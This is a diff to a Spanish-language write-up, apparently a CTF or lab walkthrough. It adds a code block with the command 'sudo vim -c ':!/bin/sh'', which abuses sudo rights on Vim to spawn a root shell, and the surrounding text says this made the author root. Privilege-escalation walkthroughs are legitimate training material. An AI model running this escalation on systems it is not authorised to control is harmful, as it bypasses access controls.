@@ -33,5 +33,9 @@ Ponemos en el buscador Vim y accedemos a la sección SUDO.
 
 Probamos el comando y vemos que ya somos root.
 
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
 [![Root](/root_sudo.png)](/root_sudo.png)
 
